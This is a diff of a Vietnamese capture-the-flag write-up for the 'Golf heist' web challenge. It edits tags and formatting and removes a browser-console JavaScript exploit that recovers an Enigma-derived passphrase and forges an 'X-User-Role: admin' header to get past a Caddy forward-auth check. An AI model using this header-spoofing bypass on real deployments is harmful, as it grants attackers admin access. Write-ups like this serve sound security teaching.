@@ -3,12 +3,14 @@ title: Golf heist
 date: 2026-09-27
 ctf: CSAW' 26 QUALS
 category: web
-difficulty: Gold 3
+difficulty: Bronze 1
 tags:
   - Header Injection
+  - Auth Bypass
   - Caddy
   - Enigma
   - FastAPI
+  - Header Spoofing
 ---
 
 ## Đề bài
@@ -36,7 +38,9 @@ async def vault_admin(body: VaultPhraseRequest, req: Request):
     return JSONResponse({"error": "Insufficient role."}, status_code=403)
 ```
 
-Vậy có 2 lớp cần phá: (1) biết `PHRASE` (3 từ, sinh ngẫu nhiên mỗi lần khởi động) và (2) có quyền admin qua header `X-User-Role: admin`.
+Vậy có 2 lớp cần phá: 
+1. biết `PHRASE` (3 từ, sinh ngẫu nhiên mỗi lần khởi động)
+2. có quyền admin qua header `X-User-Role: admin`.
 
 ### Lớp 1 — Khôi phục mật khẩu vault (Enigma)
 
@@ -96,7 +100,8 @@ Có mật khẩu, `/api/vault/enter` cho vào tầng "privileged" và gợi ý C
 }
 ```
 
-`copy_headers` copy `X-User-*` từ phản hồi auth service xuống backend. CVE GHSA-7r4p-vjf4-gxv4: Caddy dính lỗi không strip header do client gửi lên trước khi forward. `/auth` không set `X-User-Role`, nên header `X-User-Role: admin` client tự nhét vào được giữ nguyên và backend tin tưởng
+`copy_headers` copy `X-User-*` từ phản hồi auth service xuống backend. 
+CVE GHSA-7r4p-vjf4-gxv4: Caddy dính lỗi không strip header do client gửi lên trước khi forward. `/auth` không set `X-User-Role`, nên header `X-User-Role: admin` client tự nhét vào được giữ nguyên và backend tin tưởng
 ### Chuỗi khai thác
 1. `clubs/balls/bags` decode base64 thu được `R1,R2,R3` 
 2. `enigma` có được `WORDS`, ghép thành `PHRASE` 
@@ -105,7 +110,6 @@ Có mật khẩu, `/api/vault/enter` cho vào tầng "privileged" và gợi ý C
 
 ```python!
 #!/usr/bin/env python3
-# Golf Heist - CSAW' 26 QUALS. Chi dung urllib (thu vien chuan).
 # Usage: python3 exploit.py http://TARGET:PORT
 import sys, json, base64, urllib.request, urllib.error
 
@@ -185,33 +189,4 @@ Output:
 
 [+] FLAG: csaw{el3gant_sw1ng_n3ver_c4ught}
 ```
-
-Toàn bộ chuỗi khai thác cũng có thể làm được hoàn toàn trong trình duyệt, không cần chạy lệnh ngoài: 
-mở DevTools -> Console và dán đoạn tự-chứa dưới (fetch rotor từ header -> tính `enigma` -> `POST` kèm header injection):
-
-```javascript!
-(async () => {
-  const A = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
-  const W = { I:"EKMFLGDQVZNTOWYHXUSPAIBRCJ", II:"AJDKSIRUXBLHWTMCQGZNPYFVOE",
-              III:"BDFHJLCPRTXVZNYEIWGAKMUSQO", REF:"YRUHQSLDPXNGOKMIEBFZCWVJAT" };
-  const WORDS = (await (await fetch('/api/word-table')).json()).table;
-  const hint = async p => parseInt(atob((await fetch(p)).headers.get('X-Golf-Hint')), 10);
-  const R1 = await hint('/pro-shop/inventory/clubs'),
-        R2 = await hint('/pro-shop/inventory/balls'),
-        R3 = await hint('/pro-shop/inventory/bags');
-  const f = (c,w,o) => w[(A.indexOf(c)+o)%26];
-  const L = ["G","O","L"].map(s => { let c=s; c=f(c,W.I,R1%26); c=f(c,W.II,R2%26);
-              c=f(c,W.III,R3%26); c=W.REF[A.indexOf(c)]; c=f(c,W.III,(26-R3%26)%26); return c; });
-  const phrase = [WORDS[L[0]][0], WORDS[L[1]][1], WORDS[L[2]][0]].join(' ');
-  const j = await (await fetch('/api/vault/admin-item', { method:'POST',
-      headers: { 'content-type':'application/json', 'X-User-Role':'admin' },
-      body: JSON.stringify({ phrase }) })).json();
-  return j.flag;
-})().then(f => console.log("FLAG:", f));
-```
-
-Console cho thấy 3 request `418 I'm a Teapot` (rò rỉ rotor qua header) rồi in ra flag:
-
-![image](./04-console.png)
-
 -> Flag: `csaw{el3gant_sw1ng_n3ver_c4ught}`
